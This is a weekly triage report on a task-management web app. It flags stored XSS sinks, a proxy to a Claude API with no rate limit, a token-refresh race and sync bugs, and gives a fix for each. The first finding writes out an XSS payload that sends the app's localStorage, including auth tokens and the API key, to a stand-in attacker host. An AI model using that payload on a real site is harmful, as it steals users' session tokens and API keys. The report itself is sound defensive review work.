# Weekly Triage — 2026-07-13

## 📊 Week at a glance
- **Commits:** 3 | **Files changed:** 5 | **Debt markers added:** 0 explicit TODOs/FIXMEs
- **High-churn files:** `index.html` (3×), `sw.js` (3×), `supabase-setup.sql` (1×)
- **New files this week:** `api/claude.js` (serverless proxy)
- All three commits landed within 30 minutes of each other on 2026-07-06

---

## 🚨 Needs immediate attention

### 1. `toast()` passes raw task titles into `innerHTML` — stored XSS in production
`index.html:2666, 4139, 4162`  
**Commit:** e0b0a00 — the toast helper was introduced/used here and callers like `'Completed: '+t.title` are concatenated without escaping.  
**Why this matters:** A task with title `<img src=x onerror=fetch('https://evil.example?d='+localStorage.getItem('taskos'))>` executes when the user completes it. In hosted mode this is a self-XSS that leaks the full state blob including the Supabase token and any Claude key.  
**Fix:** In `toast()`, change `el.innerHTML=msg` → `el.textContent=msg` for all non-HTML callsites, or wrap task title interpolations in `esc()` at each call site.

---

### 2. Checklist text injected raw into `innerHTML`
`index.html:2416`  
**Commit:** e0b0a00 — checklist editing UI was added this week.  
**Why this matters:** A checklist item saved as `<script>...</script>` executes every time the task editor opens. This persists in Supabase and affects the account on all devices.  
**Fix:** Replace `'+c.text+'` with `'+esc(c.text)+'` in the checklist render helper.

---

### 3. `aiProxy` is empty string — hosted users get no AI features
`index.html:9812`  
**Commit:** e0b0a00 — `api/claude.js` was added and the hosted auth gate was wired up, but `aiProxy` in APP_CONFIG was never set to the deployed URL.  
**Why this matters:** Every AI button (Plan my day, Auto-triage inbox, Morning briefing) shows "Add your Claude API key in Settings first" to everyone who signs up — which is exactly the wrong first impression for a SaaS product. The proxy is deployed and working; it just isn't pointed at.  
**Fix:** Deploy `api/claude.js` on Vercel, add `ANTHROPIC_API_KEY` to Vercel env vars, set `aiProxy: 'https://<vercel-app>.vercel.app/api/claude'` in APP_CONFIG.

---

### 4. No per-user rate limit on the Claude proxy
`api/claude.js` (entire file)  
**Commit:** e0b0a00 — proxy was introduced with a comment "For production add per-user rate limiting" but it ships without one.  
**Why this matters:** Once `aiProxy` is set (fix #3 above), a single account can call the proxy in a tight loop, running up Anthropic costs with no ceiling. One automated script or a curious user can drain the API budget overnight.  
**Fix:** Add an Upstash Redis sliding-window check (10 requests / minute per `uid`) before forwarding the request to Anthropic. The `SUPABASE_URL` check already extracts the uid from the JWT — use it as the rate-limit key.

---

### 5. `_sbToken()` has a concurrent-refresh race condition
`index.html:9875-9879`  
**Commit:** e0b0a00 — Supabase token refresh logic was introduced here.  
**Why this matters:** If multiple async callers (e.g. `sbSyncNow` and `callClaude` firing together) all find an expired access token, they each call `_sbAuth('refresh_token', ...)` with the same refresh token. Supabase invalidates a refresh token on first use — the second caller gets a 400 and the user is silently logged out.  
**Fix:** Add a simple in-flight promise gate:
```js
let _sbRefreshInFlight = null;
async function _sbToken(){
  if(_SB.access && Date.now() < _SB.exp - 60000) return _SB.access;
  if(!_sbRefreshInFlight) _sbRefreshInFlight = _sbAuth('refresh_token',{refresh_token:_SB.refresh})
    .then(j=>{ _sbStoreSession(j); return j.access_token; })
    .finally(()=>{ _sbRefreshInFlight=null; });
  return _sbRefreshInFlight;
}
```

---

### 6. `S={...S,...remote.data}` shallow spread overwrites concurrent local writes
`index.html:10064-10071`  
**Commit:** e0b0a00 — the sync pull path was introduced here.  
**Why this matters:** If a user adds a task on their phone while their laptop is syncing, the laptop's pull overwrites the phone's in-flight write. The user sees the new task disappear silently on next reload. A last-write-wins strategy needs at minimum a timestamp comparison on the task level, not the whole state blob.  
**Fix (short-term):** Compare `S._updatedAt` vs `remote.data._updatedAt` — only apply the pull if the remote is newer. (The existing comment says "Last-write-wins by S._updatedAt" but the code doesn't actually check it.)  
**Fix (long-term):** Move to per-task conflict resolution — merge task arrays by ID, keeping the latest `updatedAt` per task.

---

## 🧹 Cleanup opportunities

### 7. `_welcomed` field not in initial S definition
`index.html:2404` (S definition), `index.html:10078, 10088`  
**Commit:** 9f898e0 — `_welcomed` was added to `S` inside `_welcomeSeed()` but never added to the initializer object.  
**Why this matters:** Low immediate risk, but the field is invisible to anyone reading the state schema. If a user clears localStorage then re-connects, the Supabase row has `_welcomed: true` but the fresh `S` starts without it — welcome seed fires again, doubling the starter tasks.  
**Fix:** Add `_welcomed: false` to the S definition at line 2404.

---

### 8. `sw.js` push notification icon path is wrong
`sw.js:42-43`  
**Commit:** `sw.js` was bumped in 2fa1c76 but the icon paths weren't corrected.  
**Why this matters:** Notification icon is `./icons/icon-192.png` but the file lives at `./icon-192.png` (no `icons/` subdirectory). Every push notification shows a broken icon badge.  
**Fix:** Change both `icon` and `badge` values to `'./icon-192.png'`.

---

### 9. 8 `console.warn()` calls left in production code
`index.html:2460, 2475, 3536, 3614, 10771, 10815, 10916, 11144`  
**Commit:** e0b0a00 (most of these were present before but shipped to hosted users this week for the first time).  
**Why this matters:** "Corrupt localStorage, using defaults" and "Notes synthesis parse failed" appearing in the browser console of paying users looks unpolished and exposes internal state labels.  
**Fix:** Either remove them or route them through a `_devLog()` helper that no-ops in production (`if(window.__DEV) console.warn(...)` or keyed off a query param).

---

### 10. Default `profileName` falls back to `'Panos'` for all users
`index.html:2406`  
**Commit:** e0b0a00 — hosted mode launched with this fallback still in place.  
**Why this matters:** New users who don't set a name see "Good morning, Panos 👋" on their dashboard. The account chip (2fa1c76) correctly derives a name from the email — this logic should be reused in `profileName` on first load too.  
**Fix:** On page load in hosted mode, if `localStorage.getItem('taskos_name')` is empty and `_SB.email` is set, derive the name from the email (same pattern already used in `_welcomeSeed()` and `_renderAccountChip()`).

---

## 🤔 Worth a second look

### 11. `authSubmit()` catch block never re-enables button if `_afterAuth()` throws
`index.html:9930, 9944-9948`  
**Commit:** e0b0a00 — `_afterAuth()` was introduced this week; it runs `sbSyncNow(true)` which can throw on a fresh account with no cloud row.  
**Why this matters:** If `_afterAuth()` throws an unhandled rejection, the login button stays as `…` and disabled forever with no message. User appears stuck without a way to retry.  
**Looks suspicious:** The outer `catch` handles auth errors, but `_afterAuth()` is inside the same `try` block and could mask a network error as a wrong-password message.  
**Fix:** Wrap `await _afterAuth()` in its own `try/catch`, keeping auth errors and post-auth sync errors in separate branches; move `btn.disabled=false` to a `finally`.

---

### 12. `_openAcctMenu()` reads `el.offsetHeight` before browser reflow
`index.html:9997-10008`  
**Commit:** 2fa1c76 — account menu was added this week.  
**Why this matters:** `el.style.display='block'; const h=el.offsetHeight;` — browsers may or may not batch the reflow; on slower mobile devices `offsetHeight` can be 0 at the time of reading, positioning the menu at the wrong Y (sitting on top of the chip rather than floating above it).  
**Looks intentional?** The pattern is common but fragile. The risk is cosmetic on desktop but can cover the chip entirely on mobile.  
**Fix:** Read `el.getBoundingClientRect()` after a `requestAnimationFrame` callback to guarantee layout is committed.

---

### 13. Readwise highlight modal sets `innerHTML` with unescaped API response title
`index.html:10346`  
**Commit:** e0b0a00 — Readwise import was introduced here.  
**Why this matters:** A book title returned from the Readwise API containing `<b>` or `<script>` would execute in the modal. Readwise data is third-party and not sanitized.  
**Looks suspicious:** The rest of the Readwise render uses `esc()` but this one specific line doesn't.  
**Fix:** Wrap the title variable in `esc()` at line 10346.

---

### 14. `aiSuggestDecisions` may lock the AI permanently on unhandled exceptions
`index.html:7704-7728`  
**Commit:** e0b0a00  
**Why this matters:** `_aiLock('aiSuggestDecisions')` is called at the top, but unlike other AI functions that wrap the body in `try/finally`, this function does not. If `callClaude()` returns but JSON parsing throws, `_aiUnlock` is skipped and the Decisions AI button is permanently disabled until page reload.  
**Looks suspicious:** All other AI functions added this week use `try{...}finally{_aiUnlock(...)}` — this one was missed.  
**Fix:** Wrap the function body in `try{...}finally{_aiUnlock('aiSuggestDecisions');}`.
